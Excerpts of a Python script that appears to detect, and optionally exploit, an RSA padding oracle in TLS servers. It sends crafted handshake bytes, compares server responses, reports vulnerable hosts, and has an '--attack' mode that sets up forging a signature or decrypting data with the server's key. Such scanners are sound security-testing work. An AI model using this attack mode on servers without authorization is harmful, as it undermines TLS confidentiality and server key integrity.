...
ch_def = bytearray.fromhex(
    "16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
ch_cbc = bytearray.fromhex(
    "1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
ch_gcm = bytearray.fromhex(
    "1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")
...
group.add_argument(
    "-r", "--raw", help="Message to sign or decrypt (raw hex bytes)")
group.add_argument("-m", "--message", help="Message to sign (text)")
parser.add_argument("s0", nargs="?", default="1",
                    help="Start for s0 value (default 1)")
parser.add_argument("limit", nargs="?", default="-1",
                    help="Start for limit value (default -1)")
parser.add_argument(
    "-a", "--attack", help="Try to attack if vulnerable", action="store_true")
parser.add_argument("-p", "--port", metavar='int',
                    default=443, help="TCP port")
...
cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(
    modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
    ...
    if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
        ...
        if args.csv:
            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (
                args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
        sys.exit(1)
    else:
        flow = True
else:
...
if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
    ...
    if args.csv:
        print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip,
                                                        oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
    quit()
...
if args.csv:
    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver,
                                                        oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
else:
    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" %
          (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
...
if args.raw:
    ...
    if not args.message:
        ...
        msg = args.message
    C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" +
            "".join("{:02x}".format(ord(c)) for c in msg), 16)
